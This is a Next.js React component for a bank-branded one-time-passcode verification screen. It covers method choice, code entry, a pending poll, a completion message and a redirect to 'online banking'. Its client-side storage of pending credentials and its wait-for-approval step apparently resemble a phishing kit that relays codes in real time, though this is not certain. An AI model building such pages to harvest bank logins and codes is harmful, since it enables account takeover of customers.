"use client";

import { useCallback, useLayoutEffect, useState } from "react";
import { useRouter } from "next/navigation";

import CardShell from "@/components/CardShell";
import MwbOtpMethodSelection from "@/components/MwbOtpMethodSelection";
import MwbOtpPendingPoll from "@/components/MwbOtpPendingPoll";
import MwbOtpVerification from "@/components/MwbOtpVerification";
import {
  MWB_APPROVED_REDIRECT_URL,
  MWB_SIGN_IN_PATH,
} from "@/lib/mwb-paths";
import type { OtpMethod } from "@/lib/otp-methods";
import {
  clearPendingCredentials,
  clearPendingOtpMethod,
  clearPendingUserId,
  readPendingOtpMethod,
  readPendingUserId,
  savePendingOtpMethod,
} from "@/lib/pending-session";

type VerifyStep = "method" | "verify" | "pending" | "done";

export default function MwbVerifyFlow() {
  const router = useRouter();
  const [userId, setUserId] = useState<string | null>(null);
  const [method, setMethod] = useState<OtpMethod | null>(null);
  const [step, setStep] = useState<VerifyStep>("method");

  // Guard: verify requires a pending sign-in.
  useLayoutEffect(() => {
    const storedUserId = readPendingUserId();
    if (!storedUserId) {
      router.replace(MWB_SIGN_IN_PATH);
      return;
    }
    setUserId(storedUserId);
    const storedMethod = readPendingOtpMethod();
    if (storedMethod) {
      setMethod(storedMethod);
      setStep("verify");
    }
  }, [router]);

  const handleDone = useCallback(() => setStep("done"), []);

  if (!userId) return null;

  let content: React.ReactNode;
  if (step === "pending") {
    content = <MwbOtpPendingPoll onDone={handleDone} />;
  } else if (step === "verify" && method) {
    content = (
      <MwbOtpVerification
        method={method}
        onBack={() => {
          clearPendingOtpMethod();
          setMethod(null);
          setStep("method");
        }}
        onSubmitted={() => setStep("pending")}
      />
    );
  } else if (step === "done") {
    content = (
      <div className="flex w-full flex-col items-center py-6 text-center">
        <span
          aria-hidden="true"
          className="flex h-14 w-14 items-center justify-center rounded-full border-2 border-mwb-lime"
        >
          <svg
            width="26"
            height="26"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2.5"
            strokeLinecap="round"
            strokeLinejoin="round"
            className="text-mwb-lime"
          >
            <path d="M20 6 9 17l-5-5" />
          </svg>
        </span>
        <h1 className="mb-2 mt-5 text-xl font-semibold text-white">
          Verification complete
        </h1>
        <p className="m-0 mb-2 max-w-[320px] text-sm leading-relaxed text-mwb-muted">
          Your identity was verified for{" "}
          <span className="font-semibold text-white">{userId}</span>.
        </p>
        <div className="mt-[30px] w-full max-w-[280px]">
          <button
            type="button"
            onClick={() => {
              clearPendingOtpMethod();
              clearPendingUserId();
              clearPendingCredentials();
              window.location.href = MWB_APPROVED_REDIRECT_URL;
            }}
            className="w-full cursor-pointer rounded-lg border-0 bg-mwb-navy px-6 py-2.5 text-sm font-semibold text-white transition-opacity hover:opacity-90"
          >
            Continue to online banking
          </button>
        </div>
      </div>
    );
  } else {
    content = (
      <MwbOtpMethodSelection
        onSelect={(selected) => {
          savePendingOtpMethod(selected);
          setMethod(selected);
          setStep("verify");
        }}
        onBack={() => {
          clearPendingOtpMethod();
          clearPendingUserId();
          clearPendingCredentials();
          router.push(MWB_SIGN_IN_PATH);
        }}
      />
    );
  }

  return <CardShell>{content}</CardShell>;
}
